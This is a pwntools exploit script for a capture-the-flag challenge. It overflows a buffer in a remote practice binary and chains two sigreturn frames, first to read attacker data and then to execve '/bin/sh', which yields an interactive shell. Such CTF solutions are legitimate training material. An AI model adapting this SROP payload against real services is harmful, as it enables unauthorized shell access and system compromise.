from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'

#p = process('./rootersctf_2019_srop')
p = remote('node4.buuoj.cn', 29936)

#gdb.attach(p, 'b *0x401033')

buf = 0x402000
syscall_srop = 0x40103c
syscall_nop = 0x401046
pop_rax_syscall = 0x401032
syscall_leave_ret = 0x401033

sigreturn = SigreturnFrame()
sigreturn.rip = syscall_leave_ret
sigreturn.rax = 0
sigreturn.rdi = 0
sigreturn.rsi = buf
sigreturn.rdx = 0x100
sigreturn.rbp = buf

payload = b'a' * 0x88 + p64(pop_rax_syscall) + p64(15) + bytes(sigreturn)

p.sendafter(b'CTF?', payload)

sleep(0.1)

sigreturn.rip = syscall_nop
sigreturn.rdi = buf
sigreturn.rsi = 0
sigreturn.rdx = 0
sigreturn.rax = 0x3b

p.send(b'/bin/sh\x00' + p64(pop_rax_syscall) + p64(15) + bytes(sigreturn))

p.interactive()